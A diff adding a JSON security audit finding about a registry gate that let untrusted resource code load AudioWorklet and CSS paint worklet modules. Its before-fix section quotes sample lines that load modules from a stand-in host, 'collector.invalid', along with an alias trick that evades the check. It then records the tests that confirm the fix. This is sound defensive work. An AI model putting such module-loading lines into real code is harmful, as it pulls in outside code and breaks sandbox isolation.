@@ -1,0 +1,74 @@
+{
+  "schemaVersion": 1,
+  "finding": "SEC-37-118",
+  "auditId": "AUD-280",
+  "severity": "medium",
+  "title": "Registry gate allowed worklet module loading",
+  "capturedAtUtc": "2026-10-22T15:09:53Z",
+  "scope": "Static TypeScript source admission only. No resource source was executed and no external request was sent.",
+  "beforeFix": {
+    "acceptedSource": "const context = new AudioContext(); context.audioWorklet.addModule('https://collector.invalid/processor.js');",
+    "result": "pass",
+    "secondAcceptedSource": "CSS.paintWorklet.addModule('https://collector.invalid/paint.js');",
+    "secondResult": "pass",
+    "dynamicAliasGap": "const worklet = CSS.paintWorklet; worklet[getModuleMethod()]('/paint.js');",
+    "dynamicAliasResultAfterFirstFix": "pass"
+  },
+  "reproductionCommand": "pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts",
+  "afterFix": {
+    "focusedFileTests": "4 passed",
+    "registryGatePackageTests": "78 passed",
+    "fullWorkspaceTests": "1208 passed across 77 files",
+    "workspaceTypecheck": "22 packages passed",
+    "targetedEslint": "passed",
+    "sitesWorkerCspRegression": {
+      "command": "pnpm exec playwright test --config tests/e2e/sites-preview.playwright.config.ts tests/e2e/sites-preview-csp.spec.ts -g \"an untrusted preview cannot send data\"",
+      "projectsPassed": [
+        "sites-chromium",
+        "sites-mobile-chromium"
+      ],
+      "result": "2 passed",
+      "assertions": [
+        "The opaque resource preview's AudioWorklet addModule request rejects under the existing CSP.",
+        "No external response succeeds; the request is classified as blocked by policy.",
+        "No unexpected console error or uncaught page error is reported."
+      ]
+    },
+    "canonicalResourceIsolation": {
+      "scanned": 324,
+      "passed": 324,
+      "skippedSymlinks": 0,
+      "failures": 0
+    },
+    "aggregateAuditAll": {
+      "command": "pnpm audit:all",
+      "result": "passed",
+      "behavioralGates": "16/16",
+      "astroPagesBuilt": 718,
+      "sitesWorkerBuild": "passed",
+      "bundleBudgets": "passed",
+      "provenanceSecretsAndDependencyAudits": "passed"
+    },
+    "fullPlaywright": {
+      "command": "pnpm test:e2e",
+      "result": "passed",
+      "passed": 438,
+      "configuredSkips": 133,
+      "failed": 0,
+      "workletCspRegression": "passed in desktop and mobile Sites Worker projects"
+    }
+  },
+  "coverage": [
+    "Direct AudioWorklet and CSS paint Worklet addModule calls",
+    "Alias and destructured Worklet references",
+    "Prior mutable assignments",
+    "Static Reflect.get and unknown computed method lookups",
+    "Typed Worklet parameters",
+    "Complete runRegistryGate contribution rejection"
+  ],
+  "affectedCode": [
+    "packages/registry-gate/src/checks/isolation-check.ts",
+    "packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts"
+  ],
+  "deployment": "not deployed; release-candidate verification remains open"
+}
